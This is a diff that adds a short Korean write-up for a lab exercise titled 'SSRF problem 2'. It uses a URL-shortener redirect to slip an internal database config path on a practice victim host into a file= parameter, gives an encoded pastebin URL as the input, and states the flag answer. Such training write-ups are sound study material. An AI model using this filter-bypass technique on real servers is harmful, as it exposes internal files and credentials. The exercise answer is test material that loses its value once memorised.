@@ -1,0 +1,17 @@
+=========================================
+* SSRF 문제 2번
+=========================================
+
+1.풀이과정 
+
+url 단축을 이용해 file= 안에 입력한다.
+http://eqst-ssrf-victim.com/include/db_conf.php -> https://buly.kr/6Mrv4kG
+
+2. URL 파라미터
+file=__입력값__
+
+https%3A%2F%2Fpastebin.com%2Fraw%2FCiLWksMZ
+
+3. 정답
+admin_will_be_fired
+=========================================
